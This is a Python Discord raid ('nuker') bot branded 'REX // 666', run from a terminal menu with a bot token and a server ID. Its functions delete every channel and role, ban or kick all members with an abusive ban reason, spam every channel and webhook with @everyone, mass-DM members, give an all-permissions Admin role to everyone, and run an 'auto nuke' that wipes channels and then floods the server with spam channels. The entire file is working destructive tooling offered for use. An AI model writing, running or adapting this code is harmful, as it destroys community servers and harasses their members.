# DONT TOUCH IT
import discord
from discord.ext import commands
import asyncio
from pystyle import Center, Colorate, Colors
import os
from colorama import Style
import time
import random
import urllib
import config
import json
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from config import SERVER_CONFIG

ascii_art = r"""
                                    @@@       @@@                               
@@@@@@@  @@@@@@@@ @@@  @@@         @@@       @@@       @@@@@    @@@@@    @@@@@  
@@!  @@@ @@!      @@!  !@@        @@@       @@@      @@!@     @@!@     @@!@     
@!@!!@!  @!!!:!    !@@!@!        !!@       !!@       @!@!@!@  @!@!@!@  @!@!@!@  
!!: :!!  !!:       !: :!!       !!!       !!!        !!:  !!! !!:  !!! !!:  !!! 
 :   : : : :: ::  :::  :::     :!:       :!:          : : ::   : : ::   : : ::  
                              : :       : :                                     
REX // 666                
"""

# 🔵🟢 ASCII ART को GRADIENT में
print(Colorate.Vertical(Colors.blue_to_green, ascii_art))

print("  ")
print("  ")
print("  ")
print("  ")

# ============================================ TOKEN INPUT ============================================
print(Colorate.Horizontal(Colors.blue_to_green, "🔐 ENTER BOT TOKEN ~ "))
bot_token = input(Colorate.Horizontal(Colors.blue_to_green, "TOKEN ~ "))

# Validate token
if not bot_token or len(bot_token) < 50:
    print(Colorate.Horizontal(Colors.red_to_blue, "❌ INVALID TOKEN!"))
    time.sleep(3)
    exit()
else:
    print(Colorate.Horizontal(Colors.blue_to_green, "✅ TOKEN ACCEPTED"))
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')

# ============================================ LOAD OTHER CONFIGS ============================================
try:
    with open('config.json') as f:
        config_data = json.load(f)
except:
    config_data = {}

# 🔵🟢 INPUT PROMPT को GRADIENT में
server_id = input(Colorate.Horizontal(Colors.blue_to_green, "ENTER GUILD ID ~ "))

intents = discord.Intents.all()
intents.guilds = True
bot = commands.Bot(command_prefix=".", intents=intents)

def viper():
    ascii_art = r"""
██████╗ ███████╗██╗  ██╗        ██╗ ██╗     ██████╗  ██████╗  ██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝       ██╔╝██╔╝    ██╔════╝ ██╔════╝ ██╔════╝ 
██████╔╝█████╗   ╚███╔╝       ██╔╝██╔╝     ███████╗ ███████╗ ███████╗ 
██╔══██╗██╔══╝   ██╔██╗      ██╔╝██╔╝      ██╔═══██╗██╔═══██╗██╔═══██╗
██║  ██║███████╗██╔╝ ██╗    ██╔╝██╔╝       ╚██████╔╝╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝ ╚═╝         ╚═════╝  ╚═════╝  ╚═════╝ 
    """
    
    # 🔵🟢 VIPER ASCII को GRADIENT में
    print(Colorate.Vertical(Colors.blue_to_green, ascii_art))

def cc():
    os.system('cls' if os.name == 'nt' else 'clear')

@bot.event
async def on_ready():
    cc()
    viper()
    await show_menu()

async def show_menu():
    while True:
        # 🔵🟢 MENU TEXT को GRADIENT में
        menu_text = """
╔════════════════════════════════════════════════╗   
║                                                ║
║           * NEVER MESS WITH US *               ║
║             ══════════════════                 ║
║                 REX // 666                     ║  
║                                                ║ 
║    01  AUTO NUKE        06  GET ADMIN          ║
║    02  WEBHOOK SPAM     07  DM EVERYONE        ║
║    03  CREATE ROLES     08  CREATE CHANNEL     ║
║    04  DELETE ROLES     09  DELETE CHANNEL     ║
║    05  BAN ALL          10  CHANGE SERVER INF  ║
║    X   REX // 666       11  EXIT               ║
║                                                ║
╚════════════════════════════════════════════════╝
        """
        
        # MENU को LEFT SIDE करने के लिए - CENTER REMOVE KARDO
        print(Colorate.Vertical(Colors.blue_to_green, menu_text))
          
        # 🔵🟢 REX PROMPT को GRADIENT में
        choice = await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.blue_to_green, "REX ~ "))

        # Choice handling...
        if choice == '1' or choice == '01':
            await nuke(server_id)  # BAS ISME SE DELETE ROLES HATA DIYA
        elif choice == '2' or choice == '02':
            await webhook_spam(server_id)
        elif choice == '3' or choice == '03':
            await create_roles(server_id)
        elif choice == '4' or choice == '04':
            await delete_roles(server_id)
        elif choice == '5' or choice == '05':
            await ban_all(server_id)
        elif choice == '6' or choice == '06':
            await get_admin(server_id)
        elif choice == '7' or choice == '07':
            await dm_all(server_id)
        elif choice == '8' or choice == '08':
            await create_channels(server_id)
        elif choice == '9' or choice == '09':
            await delete_channels(server_id)
        elif choice == '10':
            await change_server(server_id, bot)
        elif choice == '11':
            print(Colorate.Horizontal(Colors.blue_to_green, "CLOSING THE TERMINAL..."))
            await bot.close()
            os._exit(0)
        elif choice.lower() == 'x':
            print(Colorate.Horizontal(Colors.blue_to_green, "NOT AVAILABLE"))
            continue
        else:
            print(Colorate.Horizontal(Colors.blue_to_green, "PLEASE PICK A VALID CHOICE"))
            continue
        
        await bot.loop.run_in_executor(None, input, Colorate.Horizontal(Colors.blue_to_green, "PRESS ENTER TO RETURN TO THE MENU"))
        cc()
        viper()

async def delete_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.blue_to_green, "[-] SERVER NOT FOUND."))
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.blue_to_green,(f"U WANNA DELETE EVERY CHANNEL? Y/N ~ "))))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.blue_to_green,"OPERATION CANCELED.")))
        return

    try:
        channels = guild.channels
        delete_tasks = [channel.delete() for channel in channels]
        await asyncio.gather(*delete_tasks)
        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] ALL CHANNELS DELETED SUCCESSFULLY.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR DELETING CHANNELS: {e}")))

async def delete_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.blue_to_green, "[-] SERVER NOT FOUND."))
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.blue_to_green,f"DO YOU WANT TO DELETE ALL ROLES? Y/N ~ ")))
    confirm = confirm.lower()
    if confirm != 'y':
        print((Colorate.Horizontal(Colors.blue_to_green,"OPERATION CANCELED.")))
        return

    roles_to_delete = [role for role in guild.roles if role != guild.default_role]

    tasks = []
    for role in roles_to_delete:
        tasks.append(delete_role(role))

    results = await asyncio.gather(*tasks)

    for role, success in zip(roles_to_delete, results):
        if success:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] DELETED ROLE {role.name}")))
        else:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[-] FAILED TO DELETE ROLE {role.name}")))

async def delete_role(role):
    try:
        await role.delete()
        return True
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] FAILED TO DELETE ROLE {role.name}. MISSING PERMISSIONS.")))
        return False
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] FAILED TO DELETE ROLE {role.name} DUE TO HTTPEXCEPTION: {e}")))
        return False

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            # SIRF CHANNELS DELETE KARO, ROLES DELETE MAT KARO
            channel_futures = [delete_channel(channel) for channel in guild.channels]


            channel_results = await asyncio.gather(*channel_futures)
            # role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] {channels_deleted} CHANNELS DELETED, {channels_not_deleted} CHANNELS NOT DELETED")))
            print((Colorate.Horizontal(Colors.blue_to_green,"[+] AUTO NUKE COMPLETE - ROLES WERE NOT DELETED")))
            
            # AUTO RAID BHI CHALA DO NUKE KE BAD
            await auto_raid(server_id)
        else:
            print((Colorate.Horizontal(Colors.blue_to_green,"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print(Colorate.Horizontal(Colors.blue_to_green, "[-] SERVER NOT FOUND."))
        return

    num_channels = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.blue_to_green,(f"HOW MANY CHANNELS ~ "))))
    try:
        num_channels = int(num_channels)
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID NUMBER. PLEASE ENTER A NUMERIC VALUE.")))
        return

    base_name = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.blue_to_green,(f"CHANNEL NAMES ~ "))))

    tasks = []
    for i in range(num_channels):
        channel_name = f"{base_name}"
        tasks.append(create_text_channel(guild, channel_name))

    await asyncio.gather(*tasks)

async def create_text_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(channel_name)
        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] CHANNEL CREATED: {channel.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] FAILED TO CREATE CHANNEL '{channel_name}': {e}")))

async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input((Colorate.Horizontal(Colors.blue_to_green,f"HOW MANY MESSAGES? ~ "))))
            message_content = input((Colorate.Horizontal(Colors.blue_to_green,f"CUSTOM MESSAGE OR EMBED ~ ")))

            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input((Colorate.Horizontal(Colors.blue_to_green,f"@everyone Y/N ~"))).lower()
                include_everyone = include_everyone_input == 'y'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] {num_messages} MESSAGES SENT TO ALL TEXT CHANNELS - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Horizontal(Colors.blue_to_green,f"[+] MESSAGE SENT TO {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND MESSAGES TO {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] EMBED SENT TO {channel.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND EMBED TO {channel.name}: {e}")))

from config import NO_BAN_KICK_ID

async def ban_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green, "[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print((Colorate.Horizontal(Colors.blue_to_green, "[-] SERVER NOT FOUND.")))
        return

    confirm = await asyncio.to_thread(input, (Colorate.Horizontal(Colors.blue_to_green, "BAN ALL MEMBERS? Y/N ~ ")))
    confirm = confirm.lower()
    if confirm != "y":
        print((Colorate.Horizontal(Colors.blue_to_green, "OPERATION CANCELED.")))
        return

    ban_tasks = []
    for member in guild.members:
        if member.id in NO_BAN_KICK_ID or member == bot.user:
            continue

        ban_tasks.append(ban_member(member))

    try:
        await asyncio.gather(*ban_tasks)
        print((Colorate.Horizontal(Colors.blue_to_green, "[+] ALL ELIGIBLE MEMBERS BANNED SUCCESSFULLY.")))
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.blue_to_green, "[-] FAILED TO BAN MEMBERS. MISSING PERMISSIONS.")))
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.blue_to_green, f"[-] FAILED TO BAN MEMBERS DUE TO HTTP EXCEPTION: {e}")))

async def ban_member(member):
    try:
        await member.ban(reason="FUCKED BY MADMAXX", delete_message_days=0)
        print((Colorate.Horizontal(Colors.blue_to_green, f"[+] {member.name} GOT BANNED.")))
    except discord.Forbidden:
        print((Colorate.Horizontal(Colors.blue_to_green, f"[-] FAILED TO BAN {member.name}. MISSING PERMISSIONS.")))
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.blue_to_green, f"[-] FAILED TO BAN {member.name} DUE TO HTTP EXCEPTION: {e}")))

async def create_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID SERVER ID. PLEASE ENTER A NUMERIC ID.")))
        return

    if guild is None:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] SERVER NOT FOUND.")))
        return

    num_roles = await asyncio.to_thread(input, ((Colorate.Horizontal(Colors.blue_to_green,f"HOW MANY ROLES? ~ "))))
    try:
        num_roles = int(num_roles)
    except ValueError:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID NUMBER. PLEASE ENTER A NUMERIC VALUE.")))
        return

    base_name = await asyncio.to_thread(input, ((Colorate.Horizontal(Colors.blue_to_green,f"ROLE NAMES ~ "))))

    role_creation_tasks = []
    for i in range(num_roles):
        role_name = f"{base_name}"
        role_creation_tasks.append(guild.create_role(name=role_name))

    try:
        created_roles = await asyncio.gather(*role_creation_tasks)
        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] ALL ROLES CREATED SUCCESSFULLY")))
        for role in created_roles:
            print(Colorate.Horizontal(Colors.blue_to_green, f"- {role.name}"))
    except discord.HTTPException as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] FAILED TO CREATE ROLES DUE TO HTTPEXCEPTION: {e}")))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input(Colorate.Horizontal(Colors.blue_to_green, "HOW MANY MESSAGES TO SEND (MAX 20) ~ ")))
            if num_messages > 20:
                num_messages = 20
            message_content = input(Colorate.Horizontal(Colors.blue_to_green, "MESSAGE TO EVERYONE ~ "))

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()
            count = 0
            for member in guild.members:
                if count >= num_messages:
                    break
                if not member.bot:
                    try:
                        start_time_member = time.time()
                        for _ in range(num_messages):
                            await member.send(message_content)
                            end_time_member = time.time()
                            print(Colorate.Horizontal(Colors.blue_to_green, f"[+] MESSAGE SENT TO {member.name} - TIME TAKEN: {end_time_member - start_time_member:.2f} SECONDS"))
                            members_sent += 1
                        count += 1
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_green, f"[-] CAN'T SEND MESSAGE TO {member.name}: {e}"))
                        members_fail += 1

            end_time_total = time.time()
            print(Colorate.Horizontal(Colors.blue_to_green, f"[-] COMMAND USED: DM ALL - {members_sent} MESSAGES SENT, {members_fail} MESSAGES FAILED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS"))
        else:
            print(Colorate.Horizontal(Colors.blue_to_green, "[-] GUILD NOT FOUND."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.blue_to_green, f"[-] ERROR: {e}"))

from config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Horizontal(Colors.blue_to_green,f"KICK ALL MEMBERS Y/N ~ "))).lower()
            if confirm == "y":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Horizontal(Colors.blue_to_green,f"[+] {members_kicked} MEMBERS KICKED, {members_failed} MEMBERS NOT KICKED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))
            else:
                print((Colorate.Horizontal(Colors.blue_to_green,f"[-] KICK ALL OPERATION CANCELED.")))
        else:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] MEMBER {member.name} KICKED")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Horizontal(Colors.blue_to_green,f"[-] MEMBER {member.name} IS IN THE WHITELIST, NO KICK.")))
            return False
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T KICK {member.name}: {e}")))
        return False
    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Horizontal(Colors.blue_to_green,f"USER ID OR ENTER FOR EVERYONE ~ ")))

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] ADMIN ROLE GRANTED TO {member.name} - TIME TAKEN: {end_time_member - start_time_member:.2f} SECONDS")))
                    except Exception as e:
                        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T GRANT ADMIN ROLE TO {member.name}: {e}")))

                end_time_total = time.time() 
                print((Colorate.Horizontal(Colors.blue_to_green,f"[+] COMMAND USED: GET ADMIN - ADMIN ROLE GRANTED TO THE ENTIRE SERVER - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] ADMIN ROLE GRANTED TO {target_user.name} - TIME TAKEN: {end_time_target_user - start_time_target_user:.2f} SECONDS")))
                        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] COMMAND USED: GET ADMIN - ADMIN ROLE GRANTED TO THE ENTIRE SERVER - TOTAL TIME TAKEN: {end_time_target_user - start_time_target_user:.2f} SECONDS")))
                    else:
                        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] USER WITH ID {user_id_or_all} NOT FOUND.")))

                except ValueError:
                    print((Colorate.Horizontal(Colors.blue_to_green,f"[-] INVALID USER ID. PLEASE ENTER A VALID USER ID OR PRESS ENTER FOR THE ENTIRE SERVER.")))

        else:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

import asyncio
import os
import aiohttp
import config
import discord

async def change_server(server_id, bot):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.blue_to_green, "[-] GUILD NOT FOUND."))
            return

        server_config = config.SERVER_CONFIG
        new_name = server_config.get('new_name', guild.name)
        new_icon_url = server_config.get('new_icon', None)

        start_time = asyncio.get_event_loop().time()

        tasks = [guild.edit(name=new_name)]
        print(Colorate.Horizontal(Colors.blue_to_green, f"[+] SERVER NAME CHANGED TO {new_name}"))

        if new_icon_url:
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(new_icon_url) as response:
                        if response.status == 200:
                            icon_data = await response.read()
                            tasks.append(guild.edit(icon=icon_data))
                            print(Colorate.Horizontal(Colors.blue_to_green, "[+] SERVER ICON CHANGED"))
                        else:
                            print(Colorate.Horizontal(Colors.blue_to_green, f"[-] FAILED TO FETCH ICON: HTTP {response.status}"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.blue_to_green, f"[-] ERROR FETCHING ICON: {e}"))

        elif not new_icon_url:
            icon_path = input(Colorate.Horizontal(Colors.blue_to_green, "Enter path for new icon (or press Enter to skip): ")).strip()
            if icon_path and os.path.exists(icon_path) and icon_path.lower().endswith(('.jpg', '.png')):
                try:
                    with open(icon_path, "rb") as icon_file:
                        icon_data = icon_file.read()
                    tasks.append(guild.edit(icon=icon_data))
                    print(Colorate.Horizontal(Colors.blue_to_green, "[+] SERVER ICON CHANGED FROM FILE"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.blue_to_green, f"[-] FAILED TO CHANGE ICON FROM FILE: {e}"))
            else:
                print(Colorate.Horizontal(Colors.blue_to_green, "[-] NO VALID ICON PROVIDED. SKIPPING ICON UPDATE."))

        await asyncio.gather(*tasks)

        end_time = asyncio.get_event_loop().time()
        print(Colorate.Horizontal(Colors.blue_to_green, f"[+] SERVER INFORMATION UPDATED SUCCESSFULLY - TIME TAKEN: {end_time - start_time:.2f} SECONDS"))

    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = int(e.retry_after) if hasattr(e, "retry_after") else 10
            print(Colorate.Horizontal(Colors.blue_to_green, f"[-] RATE LIMITED. WAITING {retry_after} SECONDS BEFORE RETRY..."))
            await asyncio.sleep(retry_after)
            await change_server(server_id, bot)
        else:
            print(Colorate.Horizontal(Colors.blue_to_green, f"[-] HTTP ERROR: {e}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.blue_to_green, f"[-] GENERAL ERROR: {e}"))

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print((Colorate.Horizontal(Colors.blue_to_green,f"[+] WEBHOOK CREATED FOR {channel.name}: {webhook.name}")))
                webhooks.append(webhook)

        num_messages = int(input((Colorate.Horizontal(Colors.blue_to_green,f"NUMBER OF MESSAGES ~ "))))

        message_content = input((Colorate.Horizontal(Colors.blue_to_green,f"ENTER MESSAGE OR EMBED ~ ")))

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((Colorate.Horizontal(Colors.blue_to_green,f"@everyone Y/N ~ "))).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] COMMAND USED: SPAM - {num_messages} MESSAGES SENT VIA WEBHOOKS - TOTAL TIME TAKEN: {end_time_target_spam - start_time_spam:.2f} SECONDS")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")))

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print((Colorate.Horizontal(Colors.blue_to_green,f"[+] EMBED SENT VIA WEBHOOK {webhook.name}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND EMBED VIA WEBHOOK {webhook.name}: {e}")))

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print((Colorate.Horizontal(Colors.blue_to_green,f"[+] MESSAGE SENT VIA WEBHOOK {webhook.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND MESSAGES VIA WEBHOOK {webhook.name}: {e}")))

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print((Colorate.Horizontal(Colors.blue_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        print((Colorate.Horizontal(Colors.blue_to_green,f"[-] ERROR: {e}")))

from config import AUTO_RAID_CONFIG

def log_message(message):
    print((message))

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] CHANNEL {channel.name} DELETED - TIME TAKEN: {end_time - start_time:.2f} SECONDS")))
        return True
    except discord.NotFound:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] CHANNEL {channel.name} NOT FOUND OR ALREADY DELETED.")))
        return False
    except discord.Forbidden:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] PERMISSION DENIED TO DELETE CHANNEL {channel.name}.")))
        return False
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] ERROR DELETING CHANNEL {channel.name}: {e}")))
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] CHANNEL CREATED: {new_channel.name} - TIME TAKEN: {end_time - start_time:.2f} SECONDS")))
        return new_channel
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] CAN'T CREATE {channel_type} CHANNEL: {e}")))
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] MESSAGE {i+1}/{num_messages} SENT TO CHANNEL {channel.name}")))
        return True
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[-] CAN'T SEND MESSAGES TO CHANNEL {channel.name}: {e}")))
        return False
    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message((Colorate.Horizontal(Colors.blue_to_green,f"[+] COMMAND USED: SPAM - {num_messages} MESSAGES SENT TO ALL TEXT CHANNELS - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))
        else:
            log_message((Colorate.Horizontal(Colors.blue_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[-] MESSAGE COULDN'T BE SENT TO CHANNEL {e}")))

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(Colorate.Horizontal(Colors.blue_to_green, f"""[+] COMMAND USED: CREATE CHANNELS - {channels_created} {channel_type} CHANNELS CREATED, {channels_not_created} CHANNELS NOT CREATED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS"""))

        else:
            log_message((Colorate.Horizontal(Colors.blue_to_green,f"[-] THERE IS NO SUCH SERVER AS YOU ENTERED.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.blue_to_green,f"[-] PLEASE GIVE THE BOT ADMINISTRATOR PERMISSIONS: {e}"))) 

bot.run(bot_token)
